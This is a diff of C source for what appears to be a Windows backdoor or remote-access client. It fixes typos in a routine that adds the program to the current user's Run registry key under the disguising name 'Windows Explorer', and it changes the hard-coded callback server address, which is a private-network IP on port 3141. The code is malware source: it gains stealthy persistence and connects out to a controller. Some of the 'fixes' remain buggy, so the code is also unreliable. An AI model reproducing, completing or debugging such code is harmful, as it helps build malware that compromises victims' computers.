@@ -28,13 +28,13 @@ int RunOnBoot(){
 
   HKEY NewValue;
 
-  if (RegOpenKey(HKEY_CURRENT_USER, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewValue) != ERROR_SUCSESS) {
+  if (RegOpenKey(HKEY_CURRENT_USER, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewValue) != ERROR_SUCCESS) {
     send(sock, error, sizeof(error), 0);
     return -1;
   }
 
-  DWORD pathLenInBytes = PathLen * sizeof(*szSize);
-  if (RegSetValueEx(NewValue, TEXT("Windows Explorer"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCSESS) {
+  DWORD pathLenInBytes = PathLen * sizeof(*szPath);
+  if (RegSetValueEx(NewValue, TEXT("Windows Explorer"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
     RegCloseKey(NewValue);
     send(sock, error, sizeof(error), 0);
     return -1;
@@ -55,10 +55,10 @@ str_cut(char str[], int slice_from, int slice_to){
 
   if (slice_to < 0 && slice_from > slice_to) {
     str_len = strlen(str);
-    if (abs(slize_to) > str_len - 1)
+    if (abs(slice_to) > str_len - 1)
       return NULL;
 
-    if (abs(slize_from) > strlen)
+    if (abs(slice_from) > strlen)
       slice_from = (-1) * str_len;
 
     buffer_len = slice_to - slice_from;
@@ -138,7 +138,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
   char *ServIP;
   WSADATA wsaData;
 
-  ServIP = "192.168.1.224";
+  ServIP = "192.168.1.227";
   ServPort = 3141;
 
   if(WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
